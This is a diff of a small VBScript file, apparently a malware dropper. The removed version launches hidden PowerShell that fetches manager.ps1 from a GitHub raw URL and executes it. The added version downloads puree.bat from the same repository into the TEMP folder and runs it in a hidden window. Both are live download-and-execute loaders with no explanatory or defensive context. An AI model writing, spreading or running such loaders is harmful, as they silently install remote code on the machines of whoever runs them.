@@ -1,8 +1,15 @@
 --trunk1open--
-WScript.Sleep 11000
-Set obj = CreateObject("WScript.Shell")
-c = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI ""Start-Sleep -Seconds 6; $u='https://raw.githubusercontent.com/chotaacc/newss/main/manager.ps1'; $http=New-Object -ComObject WinHttp.WinHttpRequest.5.1; $http.Open('GET',$u,$false); $http.Send(); $c=$http.ResponseText; $s=[ScriptBlock]::Create($c); & $s"""
-obj.Run c, 0, False
+Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
+h.Open "GET", "https://raw.githubusercontent.com/chotaacc/newss/main/puree.bat", False
+h.Send
+p = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\puree.bat"
+Set s = CreateObject("ADODB.Stream")
+s.Open
+s.Type = 1
+s.Write h.ResponseBody
+s.SaveToFile p, 2
+s.Close
+CreateObject("WScript.Shell").Run p, 0, True
 --trunk1close--
 --trunk2open--
 2
